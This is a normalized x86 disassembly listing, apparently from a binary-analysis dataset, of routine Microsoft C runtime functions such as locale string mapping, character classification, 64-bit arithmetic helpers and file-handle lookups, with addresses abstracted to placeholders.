cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_41d776
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f589
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_41d7bd
add esp 0x18
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40f613
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_40f613
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_41c221
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
cmp ecx ebx
mov [ ebp - 0x8 ] ecx
je r-xdata
push eax
call sub_40f80e
cmp eax ebx
pop ecx
je r-xdata
call sub_411010
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_4109d0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_41d7bd
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_40f80e
cmp eax ebx
pop ecx
je r-xdata
call sub_411010
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_41c221
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_41c221
pop ecx
cmp [ ebp + 0x1c ] ebx
push ebx
push ebx
jne r-xdata
push eax
call sub_40f80e
cmp eax ebx
pop ecx
je r-xdata
call sub_411010
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_41c5de
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41c23c
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41c621
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
cmp eax ebx
push edi
mov edi ecx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_41d776
cmp eax 0xffffffff
pop ecx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f589
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
cmp esi ebx
mov edi eax
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_41d7bd
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_40f613
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_4109d0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_41c221
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40f80e
cmp eax ebx
pop ecx
je r-xdata
call sub_411010
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_41c7d9
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41c621
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41c819
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
call sub_40f613
push [ esi + 0x8 ]
call sub_40f613
push [ esi + 0xc ]
call sub_40f613
push [ esi + 0x10 ]
call sub_40f613
push [ esi + 0x14 ]
call sub_40f613
push [ esi + 0x18 ]
call sub_40f613
push [ esi ]
call sub_40f613
push [ esi + 0x20 ]
call sub_40f613
push [ esi + 0x24 ]
call sub_40f613
push [ esi + 0x28 ]
call sub_40f613
push [ esi + 0x2c ]
call sub_40f613
push [ esi + 0x30 ]
call sub_40f613
push [ esi + 0x34 ]
call sub_40f613
push [ esi + 0x1c ]
call sub_40f613
push [ esi + 0x38 ]
call sub_40f613
push [ esi + 0x3c ]
call sub_40f613
add esp 0x40
push [ esi + 0x40 ]
call sub_40f613
push [ esi + 0x44 ]
call sub_40f613
push [ esi + 0x48 ]
call sub_40f613
push [ esi + 0x4c ]
call sub_40f613
push [ esi + 0x50 ]
call sub_40f613
push [ esi + 0x54 ]
call sub_40f613
push [ esi + 0x58 ]
call sub_40f613
push [ esi + 0x5c ]
call sub_40f613
push [ esi + 0x60 ]
call sub_40f613
push [ esi + 0x64 ]
call sub_40f613
push [ esi + 0x68 ]
call sub_40f613
push [ esi + 0x6c ]
call sub_40f613
push [ esi + 0x70 ]
call sub_40f613
push [ esi + 0x74 ]
call sub_40f613
push [ esi + 0x78 ]
call sub_40f613
push [ esi + 0x7c ]
call sub_40f613
add esp 0x40
push [ esi + 0x80 ]
call sub_40f613
push [ esi + 0x84 ]
call sub_40f613
push [ esi + 0x88 ]
call sub_40f613
push [ esi + 0x8c ]
call sub_40f613
push [ esi + 0x90 ]
call sub_40f613
push [ esi + 0x94 ]
call sub_40f613
push [ esi + 0x98 ]
call sub_40f613
push [ esi + 0x9c ]
call sub_40f613
push [ esi + 0xa0 ]
call sub_40f613
push [ esi + 0xa4 ]
call sub_40f613
push [ esi + 0xa8 ]
call sub_40f613
add esp 0x2c
sub_41c9a9
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
push esi
call sub_40f613
pop ecx
sub_41c9e9
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40f613
pop ecx
push esi
call sub_40f613
pop ecx
sub_41ca80
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_41cac0
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_41bb49
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41cb0f
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_41cac0
pop ecx
pop ecx
retn
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
retn
sub_41cb38
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_4110bb
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_411077
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_41b87d
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_41bb49
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
jne r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx [ ebp - 0x7 ]
xor eax eax
mov ah [ ebp - 0x8 ]
or eax ecx
movzx eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41c5de
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41cc4f
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_41cb38
pop ecx
pop ecx
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
retn
add eax 0x20
retn
sub_41cc76
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_4110bb
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41e4e3
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41da5f
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
sub_41cd1c
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_4110bb
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41e4e3
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41dfa1
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
sub_41cdc2
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ecx + 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_411077
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_4108e0
inc eax
push eax
push edi
push esi
call sub_418250
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_41ce7f
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
test esi edx
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
test esi ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_41cf3a
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41ce7f
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_41eba7
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_410677
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413eb1
add esp 0x14
sub_41cfd0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_41d0b0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_41d0d8
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
test ecx 0xfcf0fce0
push esi
je r-xdata
mov esi [ ebp + 0x8 ]
test esi esi
push eax
push [ ebp + 0xc ]
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_41f59d
call sub_41f59d
mov [ esi ] eax
jmp r-xdata
call sub_411077
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_413fad
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_41f59d
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_41d142
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_411077
mov [ eax ] 0x9
call sub_41108a
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov esi ecx
and esi 0x1f
imul esi esi 0x28
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_41d1c3
mov eax [ esp + 0x4 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_41108a
and [ eax ] 0x0
call sub_411077
mov [ eax ] 0x9
or eax 0xffffffff
retn
call sub_41108a
mov [ eax ] esi
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_413fad
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
pop esi
retn
sub_41d234
push 0xc
push r--data
call sub_4106dc
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
